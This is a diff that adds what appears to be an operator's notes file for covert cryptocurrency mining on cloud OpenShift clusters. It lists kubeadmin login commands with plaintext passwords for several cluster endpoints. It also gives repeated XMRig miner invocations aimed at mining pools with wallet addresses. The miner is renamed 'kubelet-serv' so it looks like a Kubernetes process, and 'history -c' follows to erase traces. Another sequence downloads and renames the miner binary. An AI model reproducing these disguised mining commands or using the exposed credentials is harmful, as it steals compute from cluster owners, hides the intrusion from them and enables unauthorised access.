@@ -1,0 +1,79 @@
+ 
+c6a.8xlarge - approx 14KH/s
+m5.8xlarge - 8KH/s
+http://desktop-8e77tli:7801/insertIntoDB
+
+167vqcLhLdbuzv142avwovRKX2jTHZJt3ahceevQ3j1cd6wxBfQHAPzvxE587oAuobBSStv3DqHw9WgMprQsY9mPxHuhvto6vLhkJKXfsTahHXFND
+
+
+1.98 MH/s	1
+167vqcLhLdbuzv142avwovRKX2jTHZJt3ahceevQ3j1cd6wxBfQHAPzvxE587oAuobBSStv3DqHw9WgMprQsY9mPxH6zmhiWS77tRWJMVUXbvd1FL
+
+saurab
+export region=ALPHA
+oc login https://api.itzocp-66300493wq-occp.selfservice.aws.techzone.ibm.com:6443 -u kubeadmin -p YAFbi-raIzm-LgJFD-KL8Sb --insecure-skip-tls-verify
+oc login https://api.itzocp-66300493wq-qx8a.selfservice.aws.techzone.ibm.com:6443 -u kubeadmin -p CMebp-hvMmV-mwZkw-Ruw4u
+
+
+Abhi
+export region=BLUE
+oc login https://api.itzocp-550004s5fs-275b.selfservice.aws.techzone.ibm.com:6443 -u kubeadmin -p 7kSBW-d3B9W-bot8Q-f99zn
+oc login https://api.itzocp-550004s5fs-ee59.selfservice.aws.techzone.ibm.com:6443 -u kubeadmin -p vrAx8-8wPkD-MLFg6-Phger
+
+
+Piyu
+export region=ECHO
+oc login https://api.itzocp-665001dlsz-ekh1.selfservice.aws.techzone.ibm.com:6443 -u kubeadmin -p GaasB-iSq6m-frGrY-K4mYs
+oc login https://api.itzocp-665001dlsz-vw24.selfservice.aws.techzone.ibm.com:6443 -u kubeadmin -p P26rk-hyJWy-JwNyv-ICxi5
+
+Raza
+export region=DELTA
+oc login https://api.itzocp-662003jp7r-aux0.selfservice.aws.techzone.ibm.com:6443 -u kubeadmin -p WNU4R-zeW8F-Foi6Z-xpB4f
+oc login https://api.itzocp-662003jp7r-bqzn.selfservice.aws.techzone.ibm.com:6443 -u kubeadmin -p 92Paw-c9DIS-eTyVV-wc29o
+
+
+(grep -q "vm.nr_hugepages" /etc/sysctl.conf || (echo "vm.nr_hugepages=$((2048+$(nproc)))" | sudo tee -a /etc/sysctl.conf)) && sudo sysctl -w vm.nr_hugepages=$((2048+$(nproc))) \
+&& ./kubelet-serv -o de.zephyr.herominers.com:1124 -u solo:ZEPHsAdsQVhB3kz7Pa4N3dB7U3vmn2M2oTtR59KAdt3ZADnnBnSMKVzb8GLUQar5M5h78Tz2CdVydW68hamCTbxRgryikfGtuqr.${region} -B -S -a rx/0 -k --cpu-priority=5 --donate-level=0 --randomx-1gb-pages --huge-pages-jit --cpu-memory-pool=2 --randomx-no-numa
+history -c
+
+
+(grep -q "vm.nr_hugepages" /etc/sysctl.conf || (echo "vm.nr_hugepages=$((2048+$(nproc)))" | sudo tee -a /etc/sysctl.conf)) && sudo sysctl -w vm.nr_hugepages=$((2048+$(nproc))) \
+&& ./kubelet-serv -a rx/0 --url sal.kryptex.network:8028 --user solo:SaLvsBr8mLr8bBXYAt8GmbWKGPPz2VRbyMwomwn5f7TPEGbvneWX72rFo576U6JQt91PWJrDEyKwr2kxvHMozkidYNpBMfNjbqa/${region} -B -S --tls -k   --cpu-priority=5 --donate-level=0 --randomx-1gb-pages --huge-pages-jit --cpu-memory-pool=2 --randomx-no-numa
+history -c
+
+
+sed -i 's/SC11kdSsU16d814oRfizCwCkCgy2W5t75CE1omtqEF1YFP9W34NKGbFD7UB9RuKZMFFNeUebEvPT2Yhv7jVRa62M47eTuNruiX/krxYMRE33D.worker/g' *kryptex_mining_sal.sh
+
+sed -i 's/SC11kdSsU16d814oRfizCwCkCgy2W5t75CE1omtqEF1YFP9W34NKGbFD7UB9RuKZMFFNeUebEvPT2Yhv7jVRa62M47eTuNruiX/krxYMRE33D.worker/g' *kryptex_mining_sal.sh
+
+sed -i 's/krxYMRE33D.worker/iphonestockk@gmail.com/g' *kryptex_mining_sal.sh
+
+./kubelet-serv -a rx/0 --url sal.kryptex.network:8028 --user iphonestockk@gmail.com/BLUE -B -S --tls -k --cpu-priority=5 --donate-level=0 --randomx-1gb-pages --huge-pages-jit --cpu-memory-pool=2 --randomx-no-numa
+
+
+./kubelet-serv -a rx/0 --url sal.kryptex.network:8028 --user krxYMRE33D.BLUE --tls -k --cpu-priority=5 --donate-level=0 --randomx-1gb-pages --huge-pages-jit --cpu-memory-pool=2 --randomx-no-numa
+
+./kubelet-serv -o de.zephyr.herominers.com:1124 -u solo:SC11kdSsU16d814oRfizCwCkCgy2W5t75CE1omtqEF1YFP9W34NKGbFD7UB9RuKZMFFNeUebEvPT2Yhv7jVRa62M47eTuNruiX.${region} -B -S -a rx/0 -k --cpu-priority=5 --donate-level=0 --randomx-1gb-pages --huge-pages-jit --cpu-memory-pool=2 --randomx-no-numa
+
+
+ZEPHs7UTrQPE5S1Rz7TGPkg2ZLuPhfbAa8RHbJ1o7URU8FW5pqmyvvFVyVX9KmwRz83iz1LwAKZ9hBt2isBzBhZxeyQopdbRknW
+
+
+&& ./kubelet-serv -o de.zephyr.herominers.com:1124 -u solo:ZEPHsAdsQVhB3kz7Pa4N3dB7U3vmn2M2oTtR59KAdt3ZADnnBnSMKVzb8GLUQar5M5h78Tz2CdVydW68hamCTbxRgryikfGtuqr.${region} -B -S -a rx/0 -k --cpu-priority=5 --donate-level=0 --randomx-1gb-pages --huge-pages-jit --cpu-memory-pool=2 --randomx-no-numa
+
+
+&& ./kubelet-serv -o xmr-eu1.nanopool.org:10343 -u 43uVwksL85J9wAruvfwk8VFsth2uCC9ocZEQhTKG6xmvN7AXbRmqttNDSDSruwfYEQTwPeZSfYsBoLtmJPSEnRAeUjv7gxr.${region} -B -S -a rx/0 -k --cpu-priority=5 --donate-level=0 --randomx-1gb-pages --huge-pages-jit --cpu-memory-pool=2 --randomx-no-numa --randomx-mode=fast --cpu-no-yield
+
+
+./kubelet-serv -o xmr-eu1.nanopool.org:10343 -u 43uVwksL85J9wAruvfwk8VFsth2uCC9ocZEQhTKG6xmvN7AXbRmqttNDSDSruwfYEQTwPeZSfYsBoLtmJPSEnRAeUjv7gxr.ALPHA/iphonestockk@gmail -B -S --tls -a rx/0 -k --cpu-priority=5 --donate-level=0 --randomx-1gb-pages --huge-pages-jit --cpu-memory-pool=2 --randomx-no-numa --randomx-mode=fast --cpu-no-yield 
+
+xmr-eu1.nanopool.org:10343
+
+
+pkill -9 kubelet-serv
+curl -L -O https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-24-0/xmrig-6.24.0-linux-static-x64.tar.gz
+tar -xzvf xmrig-6.24.0-linux-static-x64.tar.gz
+mv xmrig kubelet-serv
+./kubelet-serv -o xmr-eu1.nanopool.org:10343 -u 43uVwksL85J9wAruvfwk8VFsth2uCC9ocZEQhTKG6xmvN7AXbRmqttNDSDSruwfYEQTwPeZSfYsBoLtmJPSEnRAeUjv7gxr.BLUE/iphonestockk@gmail -B -S -a rx/0 -k --cpu-priority=5 --donate-level=0 --randomx-1gb-pages --huge-pages-jit --cpu-memory-pool=2 --randomx-no-numa --randomx-mode=fast --cpu-no-yield --tls --threads=60
+
+
